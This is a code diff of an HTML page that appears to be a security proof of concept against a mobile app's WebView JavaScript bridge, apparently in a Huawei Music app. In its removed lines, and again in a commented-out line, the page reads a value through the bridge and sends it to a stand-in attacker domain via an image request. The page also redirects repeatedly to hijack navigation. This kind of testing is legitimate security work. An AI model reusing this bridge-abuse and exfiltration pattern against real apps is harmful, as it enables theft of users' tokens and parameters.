@@ -7,21 +7,21 @@
     </head>
     
     <body>
-        <p id="content">123</p>
+        <p id="content">Test</p>
         <script>
 
         function gotowhite(){
-            top.location.href = "https://musicsec.hwcloudtest.cn:8282/music-apph5-service/h5/index.html#/blank";
+            top.location.href = "https://www.baidu.com";
         }
         
-        function evil(){
-            var result = window.JsInterface.getParams();
-            document.getElementById("content").innerText = "www.evilsite.cn成功调用getParams获取到：\n"+result;
-            document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
+        function test(){
+            var result = window.myObj.getToken();
+            document.getElementById("content").innerText = "成功调用getToken获取到：\n"+result;
+//             document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
         }
         
         setInterval(gotowhite,5);//5毫秒
-        setTimeout(evil,3000);//倒计时3秒
+        setTimeout(test,3000);//延迟3秒执行
         </script>
     </body>
 </html>
